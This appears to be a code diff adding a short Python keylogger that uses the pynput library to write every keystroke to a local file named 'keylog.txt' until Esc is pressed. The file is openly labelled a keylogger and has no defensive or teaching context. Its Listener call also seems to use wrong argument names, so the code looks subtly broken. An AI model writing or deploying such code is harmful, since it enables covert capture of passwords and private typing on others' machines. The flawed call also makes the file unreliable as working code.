@@ -1,0 +1,22 @@
+from pynput import keyboard
+
+file = "keylog.txt"
+
+def press(key):
+    try:
+        with open(file, 'a') as f:
+            f.write(str(key.char))
+            print(f"Logged key: {key.char}")  # Debug output
+    except AttributeError:
+        with open(file, 'a') as f:
+            f.write(f" [{str(key)}] ")
+            print(f"Logged special key: {key}")  # Debug output
+
+def release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+print("Starting keylogger...")  # Debug output
+with keyboard.Listener(press=press, release=release) as listener:
+    listener.join()
+
